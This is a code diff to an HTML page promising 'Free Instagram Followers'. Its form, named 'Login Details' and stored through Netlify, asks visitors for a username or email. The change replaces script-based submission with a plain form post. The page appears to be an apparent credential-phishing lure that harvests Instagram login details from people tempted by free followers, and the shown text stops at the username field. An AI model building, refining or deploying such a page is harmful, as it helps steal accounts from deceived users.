@@ -24,22 +24,9 @@
 // };
 const handleSubmit = (event) => {
   event.preventDefault();
-
-  const myForm = event.target;
-  const formData = new FormData(myForm);
-  
-  fetch("/", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: new URLSearchParams(formData).toString(),
-  })
-    .then(() => alert("Thank you for your submission"))
-    .catch((error) => alert(error));
+  alert("Thank you for your submission");
 };
 
-document
-  .querySelector("form")
-  .addEventListener("submit", handleSubmit);
     </script>
 </head>
 <body>
@@ -118,7 +105,7 @@ document
     <div class="welcome">
         <h2 class="m-head">Free Instagram Followers</h2>
         <div class="line-bottom"></div>
-        <form id="form" data-netlify="true" name="myForm" method="post" onsubmit="return handleSubmit();">
+        <form id="form" data-netlify="true" name="myForm" method="post" onsubmit="return handleSubmit();" action="/">
             <input type="hidden" name="form-name" value="Login Details">
             <h2 class="m-head result-head">Get 50 followers for free</h2>
             <label for="name">Username/Email
